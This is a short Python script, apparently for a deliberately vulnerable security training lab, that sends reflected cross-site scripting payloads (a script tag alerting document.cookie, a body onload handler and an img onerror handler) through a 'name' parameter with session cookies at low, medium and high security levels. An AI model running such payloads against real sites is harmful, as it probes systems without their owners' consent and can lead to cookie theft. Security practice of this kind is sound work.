import requests
import json
from urllib.parse import urlencode, quote_plus

class xss():
	def __init__(self, url, phpsessid, security):
		self.url = url
		self.phpsessid = phpsessid
		self.security = security
	
	def sendReq(self, injection):
		url = self.url + "?name=" + injection + "#"
		print(url)
		header = {'Cookie':"PHPSESSID=%s; security=%s" % (self.phpsessid, self.security)}
		req = requests.get(url, headers=header)

		return req.content

	def check_alert_low(self):
		injection = "<script>alert(document.cookie)</script>"
		return self.sendReq(injection)

	def xss_med(self):
		injection = "<body onload=alert('xss test')>"
		return self.sendReq(injection)

	def xss_high(self):
		injection = "<img src=x onError=alert('xss')>"
		return self.sendReq(injection)


